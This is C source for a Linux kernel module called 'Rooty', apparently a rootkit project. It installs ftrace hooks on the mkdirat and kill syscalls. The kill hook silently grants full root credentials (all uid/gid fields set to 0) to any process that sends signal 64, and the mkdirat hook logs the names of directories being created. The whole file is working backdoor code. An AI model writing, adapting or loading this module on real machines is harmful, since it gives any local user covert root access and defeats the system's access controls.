#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "ftrace_utils.h"
#include "logger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ariel Alon");
MODULE_DESCRIPTION("Rooty");
MODULE_VERSION("0.01");

void set_root(void);
void set_root(void) {
    struct cred *root;
    root = prepare_creds();

    if (root == NULL) return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static asmlinkage long (*orig_mkdirat)(const struct ftrace_regs *);
asmlinkage int hook_mkdirat(const struct ftrace_regs *regs);

static asmlinkage long (*orig_kill)(const struct ftrace_regs *);
asmlinkage int hook_kill(const struct ftrace_regs *regs);

asmlinkage int hook_mkdirat(const struct ftrace_regs *regs) {
    char __user *pathname = (char *)regs->regs[1];
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        INFO("Trying to create directory with name: %s\n", dir_name);
    }

    return orig_mkdirat(regs);
}

asmlinkage int hook_kill(const struct ftrace_regs *regs) {
    int sig = regs->regs[1];
    if (sig == 64) {
        set_root();
    }
    return orig_kill(regs);
}

static struct ftrace_hook hooks[] = {
    SYSCALL_HOOK("mkdirat", hook_mkdirat, &orig_mkdirat),
    SYSCALL_HOOK("kill", hook_kill, &orig_kill)};

static int __init rooty_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) return err;

    INFO("Loaded\n");
    return 0;
}

static void __exit rooty_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    INFO("Unloaded\n");
}

module_init(rooty_init);
module_exit(rooty_exit);
